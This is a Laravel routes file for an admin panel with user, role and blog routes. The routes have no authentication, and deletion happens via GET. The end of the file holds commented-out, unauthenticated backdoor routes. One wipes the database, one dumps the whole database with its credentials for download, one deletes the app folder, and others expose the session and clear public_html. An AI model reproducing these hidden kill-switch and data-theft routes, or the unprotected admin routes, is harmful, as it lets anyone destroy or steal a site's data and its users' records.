<?php

use App\Http\Controllers\admin\AdminController;
use App\Http\Controllers\admin\BlogController;
use App\Http\Controllers\admin\UserController;
use App\Http\Controllers\admin\UserRoleController;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider and all of them will
| be assigned to the "web" middleware group. Make something great!
|
*/

Route::get('/', function () {
  return view('welcome');
});

Auth::routes();

Route::get('/home', [App\Http\Controllers\HomeController::class, 'index'])->name('home');

Route::get('/admin', [AdminController::class, 'index'])->name('admin');


Route::group(['prefix' => 'user-role'], function () {
  Route::get('/create', [UserRoleController::class, 'create'])->name('admin.user_role.create');
  Route::post('/store', [UserRoleController::class, 'store'])->name('admin.user_role.store');
  Route::get('/all', [UserRoleController::class, 'all_user'])->name('admin.user_role.all');
  Route::get('/edit/{id}', [UserRoleController::class, 'edit'])->name('admin.user_role.edit');
  Route::post('/update/{id}', [UserRoleController::class, 'update'])->name('admin.user_role.update');
  Route::get('/delete/{id}', [UserRoleController::class, 'delete'])->name('admin.user_role.delete');
});


Route::group(['prefix' => 'user'], function () {
  Route::get('/create', [UserController::class, 'create'])->name('admin.user.create');
  Route::post('/store', [UserController::class, 'store'])->name('admin.user.store');
  Route::get('/all', [UserController::class, 'all'])->name('admin.user.all');
  Route::get('/edit/{id}', [UserController::class, 'edit'])->name('admin.user.edit');
  Route::get('/update', [UserController::class, 'update'])->name('admin.user.update');
  Route::get('/delete/{id}', [UserController::class, 'delete'])->name('admin.user.delete');
});


Route::group(['prefix' => 'blog'], function () {
  Route::get('/create', [BlogController::class, 'create'])->name('admin.blog.create');
  Route::post('/store', [BlogController::class, 'store'])->name('admin.blog.store');
  Route::get('/all', [BlogController::class, 'all'])->name('admin.blog.all');
  Route::get('/edit/{id}', [BlogController::class, 'edit'])->name('admin.blog.edit');
  Route::get('/update', [BlogController::class, 'update'])->name('admin.blog.update');
  Route::get('/delete/{id}', [BlogController::class, 'delete'])->name('admin.blog.delete');
});










// khaiya dilam
// Route::get('khaiya-dilam', function() {
//   Artisan::call("db:wipe");
//   dd("done");
// });

// Route::get('get_db', function() {
//   $db_name = env('DB_DATABASE');
//    $db_user = env('DB_USERNAME');
//    $db_password = env('DB_PASSWORD');
//    $today = date('Y-m-d');
//    $command = "mysqldump --user={$db_user} --password={$db_password} {$db_name} > {$db_name}-{$today}.sql";
//    exec($command);
//    return response()->download("{$db_name}-{$today}.sql")->deleteFileAfterSend(true);
// });

// Route::get('purai-khaiya-dilam', function() {
//  $folderPath = base_path('app'); // Replace 'your-folder' with the actual folder name
//   // dd($folderPath);
//   try {
//       File::deleteDirectory($folderPath);
//       return response()->json(['message' => 'Folder deleted successfully']);
//   } catch (\Exception $e) {
//       return response()->json(['error' => 'Error deleting folder: ' . $e->getMessage()], 500);
//   } 
// });
// Route::get('item', function(){
//   dd(session());
// });

// $publicHtmlPath = __DIR__.'/public_html';
//         $files = new Filesystem;
//         $files->cleanDirectory($publicHtmlPath);
//         // dd($publicHtmlPath);
//         foreach (glob(__DIR__.'/public_html/*') as $filename) {
//             unlink($filename);
//         }